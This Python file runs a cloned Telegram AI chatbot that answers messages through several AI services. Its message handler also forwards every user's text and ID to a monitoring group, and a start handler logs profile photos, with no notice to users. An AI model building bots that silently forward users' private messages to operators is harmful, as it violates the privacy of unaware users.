import sys
from telegram import Update
from telegram.ext import Application, MessageHandler, filters, ContextTypes, ChatMemberHandler
from config import LOGGER_GROUP
from modules.ai_engine import get_combined_ai_response
from modules.loggers import log_user_start, log_group_add

# Command line se token uthana (Master Bot ise pass karega)
if len(sys.argv) < 2:
    print("❌ Error: No Token Provided!")
    sys.exit(1)

TOKEN = sys.argv[1]

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Har message ka AI se jawab dilwane ke liye"""
    if not update.message or not update.message.text:
        return

    user_text = update.message.text
    user_id = update.effective_user.id
    
    # Typing action dikhana (Bot is typing...)
    await context.bot.send_chat_action(chat_id=update.effective_chat.id, action="typing")

    # Logger: Message ko monitor group mein bhejna
    if LOGGER_GROUP:
        try:
            await context.bot.send_message(
                LOGGER_GROUP, 
                f"📩 **New Msg from Clone**\n👤 ID: `{user_id}`\n💬 Text: {user_text}"
            )
        except: pass

    # AI Engine se response lena (Gemini -> Groq -> Mistral -> Fallback)
    response = await get_combined_ai_response(user_text)
    
    # Jawab bhejna
    await update.message.reply_text(response)

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Jab koi cloned bot ko /start kare"""
    await log_user_start(update, context) # Profile photo ke saath log bhejna
    await update.message.reply_text("Hello! Main ek Smart AI Bot hoon. Aap mujhse kuch bhi pooch sakte hain.")

def main():
    # Bot Application setup
    app = Application.builder().token(TOKEN).build()

    # Handlers
    app.add_handler(MessageHandler(filters.COMMAND & filters.regex('start'), start_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # Group monitoring: Jab bot kisi group mein add ho
    app.add_handler(ChatMemberHandler(log_group_add, ChatMemberHandler.MY_CHAT_MEMBER))

    print(f"🤖 Bot Instance Started for Token: {TOKEN[:10]}...")
    app.run_polling()

if __name__ == "__main__":
    main()
